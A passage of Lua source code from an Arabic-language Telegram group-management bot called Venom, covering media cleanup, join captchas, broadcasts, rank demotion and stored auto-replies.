if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
msgm2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,msgm2)
end,nil)  
send(msg.chat_id_, msg.id_," 𖥔 تم تنظيف جميع الميديا")
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
database:sadd(bot_id.."banda:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."banda:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = " 𖥔 تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."banda:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("عدد الميديا") and cleaner(msg) then  
local num = database:smembers(bot_id.."banda:allM"..msg.chat_id_)
for k,v in pairs(num) do
local numl = v
if numl then
l = " 𖥔 عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = " 𖥔 لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, l)
end
if text == "تنظيف التعديل" and Manager(msg) then
Msgs = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Msgs[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data)
new = 0
Msgs2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Msgs2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Msgs2)
end,nil)  
send(msg.chat_id_, msg.id_,' 𖥔 تم تنظيف جميع الرسائل المعدله')
end
if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
if Devban(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل لي الاسم الان ")  
end
return false
end
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
if database:get(bot_id.."UnKedDeleteMessage"..msg.chat_id_) == "open" then
local Text = 'اهلاً بك في المجموعة\n للتأكد بأنك لست { ربوت }\n تم تقييدك اضغط الزر بالاسفل\n للتأكد انك { عضو حقيقي }\n'
keyboard = {}
keyboard.inline_keyboard = {{{text = '- اضغط هنا لفك تقييدك •', callback_data="/UnKed"},},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
database:sadd(bot_id.."database:Un:Ked"..msg.chat_id_,msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..tokenbot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
msg_type = 'MSG:NewUser'
end


if text == ""..(database:get(bot_id..'Name:Bot') or 'فينوم').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فينوم')
local VENOM_Msg = {
'ننعم يروحي 😻??',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
'طب متصلي على النبي كدا 🙂💜',
'تع اشرب شاي 🥺💙',
'دوس على الخوخه 🍑',
'متيجي 😉',
'ياض خش نام 😂',
'انا '..Namebot..' احسن البوتات 🤩♥️',
'نعم'
} 
Namebot = VENOM_Msg[math.random(#VENOM_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔 اضفني الي مجموعتك 𖥔 ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end
if text == "بوت" then
local Namebot = (database:get(bot_id..'Name:Bot') or 'فينوم') 
local VENOM_Msg = { 
'اسمي  '..Namebot..' يا قلبي 🤤💚',
'اسمي '..Namebot..' يا روحي🙈❤️',
'اسمي  '..Namebot..' يعمري🌚🌹',
'اسمي  '..Namebot..' يا قمر 🐭🤍',
'اسمي  '..Namebot..' يامزه 🥺❤️',
'اسمي  '..Namebot..' يعم 😒',
'مقولت اسمي '..Namebot..' في اي 🙄',
'اسمي الكيوت '..Namebot..' 🌝💘',
'اسمي  '..Namebot..' ياحياتي🧸♥️',
'اسمي  '..Namebot..' يوتكه🙈🍑',
} 
Namebot = VENOM_Msg[math.random(#VENOM_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𖥔 الـمـطـور 𖥔', url="http://t.me/"..sudos.UserName},
},
{
{text = '𖥔 اضفني الي مجموعتك 𖥔 ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end

if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
send(msg.chat_id_, msg.id_,' 𖥔 الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل الان اذاعتك \n 𖥔 للخروج ارسل الغاء") 
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
send(msg.chat_id_, msg.id_,' 𖥔 الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل الان اذاعتك \n 𖥔 للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
send(msg.chat_id_, msg.id_,' 𖥔 الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n ??  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
send(msg.chat_id_, msg.id_,' 𖥔  الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖥔 ارسل لي التوجيه الان") 
return false
end 
if text and text:match('^ضع اسم (.*)') and Manager(msg) or text and text:match('^وضع اسم (.*)') and Manager(msg) then 
local Name = text:match('^ضع اسم (.*)') or text and text:match('^وضع اسم (.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_," 𖥔 البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖥔 ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' 𖥔 تم تغيير اسم الجروب الى {[「'..Name..'」]}')  
end
end,nil) 
end

if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if (result.id_) then
if tonumber(result.id_) == true then
send(msg.chat_id_, msg.id_," 𖥔 لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id.."Sudo:User",result.id_) then
dev = "المطور ،" else dev = "" end
if database:sismember(bot_id.."CoSu",result.id_) then
cu = "فينوم،" else cu = "" end
if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if database:sismember(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Can_or_NotCan(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n 𖥔 تم تنزيل الشخص من الرتب التاليه \n 𖥔  { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n 𖥔  عذرا الـعـضو  لايملك رتبه \n")
end
if tonumber(msg.sender_user_id_) == true then
database:srem(bot_id.."Sudo:User", result.id_)
database:srem(bot_id.."CoSu", result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."CoSu",msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, start_function, nil)
end

if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_," 𖥔 لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if database:sismember(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_) then
cu = 'فينوم،' else cu = '' end
if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = 'منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = 'منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'onall'..msg.chat_id_, result.sender_user_id_) then
onall = 'مدير عام ،' else  onall = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن عام ،' else mod = '' end
if database:sismember(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = 'مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n 𖥔 تم تنزيل الشخص من الرتب التاليه \n 𖥔 { "..dev..''..crr..''..cr..''..own..''..mod..''..mn..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n 𖥔  عذرا الـعـضو  لايملك رتبه \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:ban:2',msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:User',msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'banda:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text == ("مسح الردود العامه") and Devban(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id..'List:Rd:Sudo')
end
send(msg.chat_id_, msg.id_," 𖥔 تم مسح الردود العامه")
end

if text == ("الردود العامه") and Devban(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n 𖥔 قائمة الردود العامه \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = 'اغنيه'
end
text = text..""..k.." >> 「 '..v..' 」  ↚ 「 '..db..' 」\n"
end
if #list == 0 then
text = " 𖥔 لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Sudo:Bot「'..msg.sender_user_id_..'」:'..msg.chat_id_)
if database:get(bot_id..'Set:Rd「'..msg.sender_user_id_..'」:'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Rd「'..msg.sender_user_id_..'」:'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,' 𖥔 تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd「'..msg.sender_user_id_..'」:'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الرد الذي تريد اضافته')
database:set(bot_id..'Set:Rd「'..msg.sender_user_id_..'」:'..msg.chat_id_, 'true1')
database:set(bot_id..'Text:Sudo:Bot「'..msg.sender_user_id_..'」:'..msg.chat_id_, text)
database:sadd(bot_id..'List:Rd:Sudo', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:On「'..msg.sender_user_id_..'」:'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' 𖥔 تم ازالة الرد العام')
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..v..text)
end
database:del(bot_id..'Set:On「'..msg.sender_user_id_..'」:'..msg.chat_id_)
database:srem(bot_id..'List:Rd:Sudo', text)
return false
end
end
if text == 'اضف رد عام' and Devban(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الكلمه تريد اضافتها')
database:set(bot_id..'Set:Rd「'..msg.sender_user_id_..'」:'..msg.chat_id_,true)
return false 
end
if text == 'مسح رد عام' and Devban(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الكلمه تريد مسحها')
database:set(bot_id..'Set:On「'..msg.sender_user_id_..'」:'..msg.chat_id_,true)
return false 
end
if text and not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local text1 = database:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n 𖥔 ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:VENOM:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_," 𖥔 تم مسح الرد من ردود المتعدده")
database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text2'..text)
